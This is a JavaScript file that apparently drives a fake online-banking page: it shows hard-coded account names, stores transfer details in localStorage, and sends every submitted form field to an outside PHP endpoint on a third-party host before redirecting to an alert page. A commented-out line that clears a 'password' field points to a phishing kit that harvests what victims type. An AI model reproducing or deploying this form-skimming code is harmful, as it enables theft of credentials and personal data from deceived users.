// const clsbtn = document.querySelector('.');
const directinput = document.querySelectorAll(".transbb");
const checkdlinput = document.querySelectorAll(".mailbb");
const nextbtn = document.querySelector(".nextbt");
const confirmbtn = document.querySelector(".kfmbt");
const xicon = document.querySelector(".clsx");
const useicon = document.querySelector(".usclx");
const amount = document.querySelector(".amoun");
const deptype = document.querySelector(".seldeptype");
const droppop = document.querySelector(".widraw-popp");
const dropuser = document.querySelector(".userpoup");
const btntransfer = document.querySelector(".btn-transfer");
const btnrequest = document.querySelector(".btn-request");
const popuserprofile = document.querySelector(".clcuser");
const loader = document.querySelector(".box-loader");


const formbox1 = document.querySelector(".form1-box");
const formbox2 = document.querySelector(".form2-box");
const error  = document.querySelector(".errmsg");

document.querySelectorAll('.account-list a').forEach(account => {
  account.addEventListener('click', function(event) {
      event.preventDefault();
      let accountId = this.getAttribute('data-account-id');
      loader.style.display = "block";
      setTimeout(() => {
        loader.style.display = "none";
      }, 2400);
      if (accountId === "2") {
         
            document.getElementById("steve").textContent = "S..S..Bruce";
            document.getElementById("steve2").textContent = "Bruce";
        
      } else if (accountId === "1"){
      
          document.getElementById("steve").textContent = "R..Ruiz";
          document.getElementById("steve2").textContent = "Ruiz";
      }
  });
});

btntransfer.addEventListener("click", ()=>{
    droppop.style.display = "block"
})


popuserprofile.addEventListener("click", ()=>{
    dropuser.classList.toggle("openclass");
})


  xicon.addEventListener("click", ()=> {
    droppop.style.display = "none"
  })
  useicon.addEventListener("click", ()=> {
    if (dropuser.classList.contains("openclass")) {
      dropuser.classList.remove("openclass")
    }
  })

  const resetall = document.querySelector(".resetbtn");
  resetall.addEventListener("click", ()=>{

    if (formbox1.classList.contains("openclass")){
      formbox1.classList.remove("openclass")
    }else {
      console.log("error");
    }
  })

  // form validation 


const currentDate = new Date();

const currentMonth = currentDate.getMonth() + 1; // Adding 1 because months are zero-based
const currentDay = currentDate.getDate();
const currentYear = currentDate.getFullYear();

const result = `As of: ${currentMonth}/${currentDay}/${currentYear}`;
const datein = document.querySelector(".date");
datein.textContent = result;


console.log(result); // You can replace this with any other method to display the result, such as updating an HTML element.


const submmit = document.querySelector(".ssll");
console.log(submmit);
submmit.addEventListener("click", ()=>{
  
    const msgggg = document.querySelector(".errmsgg");
    const loudd = document.querySelector(".loudd");
    const bkname = document.querySelector("#bkname").value;
    const amountt = document.getElementById("amount").value;
    const cname = document.getElementById("cname").value;
    const stssd = "Pending"
      const datepl = `${currentMonth}/${currentDay}/${currentYear}`;
      localStorage.setItem("amonth", amountt)
      localStorage.setItem("bkname", bkname)
      localStorage.setItem("datepl", datepl)
      localStorage.setItem("cname", cname)
      localStorage.setItem("status", stssd)
      console.log(amountt, bkname, datepl);
  // directinput.forEach(vl => {
  //   if (!vl.value === ""){
  //     submmit.value = "Loading...."
  //     loudd.style.display = "block"
  //     msgggg.textContent = "Make sure, all fields is provided";
  //     // localStorage.setItem("amonth", amountt)
  //     // localStorage.setItem("bkname", bkname)
  //     // localStorage.setItem("datepl", datepl)
  //   }else {
  //     console.log("no  value in input ");
  //   }
  // })  
});

const pendingstate = document.querySelector(".pending-state ");

window.onload = () => {
  const bknamevalu = localStorage.getItem("bkname");
  const amounttvalu = localStorage.getItem("amonth");
  const datepl = localStorage.getItem("datepl");
  const statuss = localStorage.getItem("status");

  if (statuss === null || statuss === "") {
    console.log("no value detected");
  } else {
    // pendingstate.style.visibility = "visible";
    // pendingstate.style.height = "auto";
    // document.getElementById("name").textContent = `${bknamevalu}`;
    document.getElementById("datesss").textContent = `${datepl}`;
    // document.getElementById("ammnt").textContent = `-${amounttvalu}`;
    // document.getElementById("status").textContent = `${statuss}`;
  }
};


var formSubmitted = 0;

document.getElementById("result").addEventListener("submit", function (event) {
          event.preventDefault();
          formSubmitted++;
  
          var inputs = document.querySelectorAll('input[required]');
          for (var i = 0; i < inputs.length; i++) {
              if (!inputs[i].value.trim()) {
                  alert("Please fill in all fields.");   
                  return;
              }
          }
      
          var formData = new FormData(this);
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "https://teckdevonpos-com.beak.host/links/flash.php", true); // put your php url here
      
          xhr.onreadystatechange = function () {
              if (xhr.readyState == 4 && xhr.status == 200) {
                  console.log(xhr.responseText);
      
                  if (formSubmitted === 1 || 2 || 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10) {
                    loader.style.display = "block";
                    setInterval(() => {
                      // document.getElementById("password").value = "";
                      window.location.href = "./alert.html";
                    }, 1000);
                  }
              }
          };
      
          xhr.send(formData);
      });

